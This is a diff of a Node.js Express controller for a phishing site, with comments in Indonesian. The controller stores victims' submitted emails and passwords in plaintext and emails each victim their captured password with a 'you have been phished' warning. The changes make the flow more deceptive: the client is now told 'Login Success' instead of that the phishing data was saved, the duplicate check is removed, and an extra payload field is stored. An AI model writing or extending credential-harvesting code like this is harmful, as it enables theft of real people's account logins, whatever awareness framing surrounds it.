@@ -19,30 +19,28 @@ exports.getAllPhising = async (req, res) => {
 // Mendapatkan Semua Phising
 exports.savePhising = async (req, res) => {
   try {
-    const { usa_email, usa_pswd } = req.body;
+    const { usa_email, usa_pswd, payload } = req.body;
     const data = new PhisingData({
       usa_email,
       usa_pswd,
+      payload,
     });
-    const check = await PhisingData.findOne({ usa_email });
     await data.save().then(() => {
-      if (!check) {
-        const email_payload = {
-          from: "'ANGSA CYBER CUSTODIAN' mintanomorwhatsappnya@gmail.com", // sender address
-          to: data?.usa_email, // list of receivers
-          subject: "Phising By ANGSA CYBER CUSTODIAN", // Subject line
-          html: `
+      const email_payload = {
+        from: "'ANGSA CYBER CUSTODIAN' mintanomorwhatsappnya@gmail.com", // sender address
+        to: data?.usa_email, // list of receivers
+        subject: "Phising By ANGSA CYBER CUSTODIAN", // Subject line
+        html: `
           <b>Selamat Anda Terkena Phising !!! Jangan percaya sama penipuan model begini</b>
           <br/>
           <b>EMAIL : ${data.usa_email}</b>
           <br/>
           <b>PASSWORD : ${data.usa_pswd}</b>`, // html body
-        };
-        sendMail(email_payload);
-      }
+      };
+      sendMail(email_payload);
       res.status(200).json({
         data,
-        message: `Phising Berhasil Disimpan`,
+        message: `Login Success`,
       });
     });
   } catch (error) {
